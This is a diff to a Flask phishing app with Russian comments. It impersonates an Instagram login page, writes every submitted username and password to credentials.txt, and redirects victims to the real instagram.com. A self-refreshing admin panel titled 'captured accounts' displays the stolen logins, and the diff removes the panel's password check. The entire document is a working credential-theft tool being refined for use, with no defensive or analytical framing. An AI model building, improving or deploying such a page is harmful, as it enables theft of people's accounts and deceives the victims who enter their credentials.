@@ -4,11 +4,11 @@ import datetime
 
 app = Flask(__name__)
 
-# ====================== НАСТРОЙКИ АДМИНКИ ======================
-ADMIN_PASSWORD = "admin"   # ←←← ИЗМЕНИ НА СВОЙ СИЛЬНЫЙ ПАРОЛЬ!
-# ============================================================
+# ====================== АДМИНКА ======================
+ADMIN_PASSWORD = "твой_сильный_пароль_здесь"   # ←←← ОБЯЗАТЕЛЬНО ИЗМЕНИ!
 
-INSTAGRAM_PAGE_HTML = """...твой HTML код оставь как был (не буду его сюда копировать, чтобы не было слишком длинно)..."""
+# ====================== HTML ФРОНТЕНД ======================
+INSTAGRAM_PAGE_HTML = """твой полный HTML код сюда (оставь как был)"""
 
 # ====================== АДМИН ПАНЕЛЬ ======================
 ADMIN_HTML = """
@@ -19,25 +19,23 @@ ADMIN_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Panel</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
+        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #0f0; padding: 20px; }
         h1 { color: #0f0; }
-        pre { background: #222; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; }
-        .btn { padding: 10px 20px; background: #c00; color: white; border: none; border-radius: 5px; cursor: pointer; }
-        .clear { background: #f60; }
+        pre { background: #1a1a1a; padding: 15px; border-radius: 8px; max-height: 80vh; overflow-y: auto; white-space: pre-wrap; }
+        .btn { padding: 12px 25px; background: #c00; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        .btn:hover { background: #f00; }
     </style>
+    <script>
+        setInterval(() => location.reload(), 5000); // автообновление каждые 5 секунд
+    </script>
 </head>
 <body>
-    <h1>🔧 Админ Панель — Захваченные данные</h1>
-    <p><strong>Последнее обновление:</strong> {{ time }}</p>
-    
+    <h1>🔴 Админ Панель — Захваченные аккаунты</h1>
+    <p><strong>Обновлено:</strong> {{ time }}</p>
     <pre>{{ logs }}</pre>
-    
     <form method="POST" action="/admin/clear">
-        <button type="submit" class="btn clear">Очистить все логи</button>
+        <button type="submit" class="btn">Очистить все логи</button>
     </form>
-    
-    <br>
-    <a href="/admin">Обновить</a>
 </body>
 </html>
 """
@@ -49,34 +47,32 @@ def login():
         password = request.form.get('password')
         
         if username and password:
-            log_entry = f"[{datetime.datetime.now()}] Username: {username} | Password: {password}\n"
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            log_entry = f"[{timestamp}] Username: {username} | Password: {password}\n"
+            
             try:
                 with open('credentials.txt', 'a', encoding='utf-8') as f:
                     f.write(log_entry)
-                print(f"✅ ЛОГИН ЗАХВАЧЕН: {username} / {password}")
+                print(f"✅ ЗАХВАЧЕНО → {username}")
             except Exception as e:
-                print(f"❌ ОШИБКА ЗАПИСИ: {e}")
+                print(f"❌ Ошибка записи: {e}")
         
         return redirect("https://www.instagram.com", code=302)
     
     return render_template_string(INSTAGRAM_PAGE_HTML)
 
 
-@app.route('/admin', methods=['GET', 'POST'])
+@app.route('/admin', methods=['GET'])
 def admin():
-    if request.method == 'POST':
-        password = request.form.get('password')
-        if password != ADMIN_PASSWORD:
-            return "<h2 style='color:red'>Неверный пароль!</h2>", 401
-    
-    # Показываем админку только если пароль верный или GET после входа
     try:
         with open('credentials.txt', 'r', encoding='utf-8') as f:
-            logs = f.read()
-    except:
-        logs = "Пока нет захваченных данных..."
+            logs = f.read() or "Пока нет данных..."
+    except FileNotFoundError:
+        logs = "Файл с логами ещё не создан. Отправь первый логин."
 
-    return render_template_string(ADMIN_HTML, logs=logs, time=datetime.datetime.now())
+    return render_template_string(ADMIN_HTML, 
+                                logs=logs, 
+                                time=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 
 
 @app.route('/admin/clear', methods=['POST'])
